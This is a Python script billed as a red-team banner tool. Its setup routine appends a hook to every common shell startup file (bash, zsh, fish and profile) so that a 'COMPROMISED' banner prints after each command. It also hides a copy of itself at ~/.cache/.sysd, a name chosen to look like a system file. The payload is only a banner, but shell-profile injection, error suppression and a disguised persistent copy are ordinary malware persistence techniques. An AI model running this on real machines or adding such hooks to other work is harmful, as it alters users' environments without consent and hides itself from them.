#!/usr/bin/env python3
# rt_banner.py - Prints red-team banner after EVERY command (zero delay)
import os
import sys

SCRIPT = os.path.abspath(__file__)

BANNER = r"""
\033[91m
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║     ██████╗ ███████╗ ███████╗██████╗ ████████╗███████╗    ║
║     ██╔════╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝    ║
║     █████╗  ██║   ██║█████╗  ██║  ██║   ██║   █████╗      ║
║     ██╔══╝  ██║   ██║██╔══╝  ██║  ██║   ██║   ██╔══╝      ║
║     ██║     ╚██████╔╝██║     ██████╔╝   ██║   ███████╗    ║
║     ╚═╝      ╚═════╝ ╚═╝     ╚═════╝    ╚═╝   ╚══════╝    ║
║                                                           ║
║             > COMPROMISED - RED TEAM ACTIVE <             ║
╚═══════════════════════════════════════════════════════════╝
\033[0m
"""

def print_banner():
    print(BANNER)

def install():
    hook = f'python3 "{SCRIPT}" 2>/dev/null || true\n'

    configs = [
        ("~/.bashrc",       hook),
        ("~/.bash_profile", hook),
        ("~/.zshrc",        hook + "precmd() { " + hook + "}\n"),  # zsh needs precmd
        ("~/.zprofile",     hook),
        ("~/.profile",      hook),
        ("~/.config/fish/config.fish",
         f'\nfunction fish_prompt\n    {hook}    command fish_prompt\nend\n')
    ]

    installed = False
    for cfg_path, content in configs:
        path = os.path.expanduser(cfg_path)
        dir_path = os.path.dirname(path)

        if not os.path.exists(dir_path):
            try:
                os.makedirs(dir_path, exist_ok=True)
            except:
                continue

        try:
            with open(path, "a") as f:
                f.write(content)
            installed = True
            print(f"[+] Injected into {cfg_path}")
        except Exception as e:
            continue

    if not installed:
        print("[-] Could not auto-install. Manual setup required.")
        return

    # Optional: hide a persistent copy
    hidden = os.path.expanduser("~/.cache/.sysd")
    os.makedirs(os.path.dirname(hidden), exist_ok=True)
    os.system(f"cp '{SCRIPT}' '{hidden}' 2>/dev/null && chmod +x '{hidden}'")

    print("[+] Red team banner will now appear after EVERY command — forever")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--setup":
        install()
    else:
        print_banner()
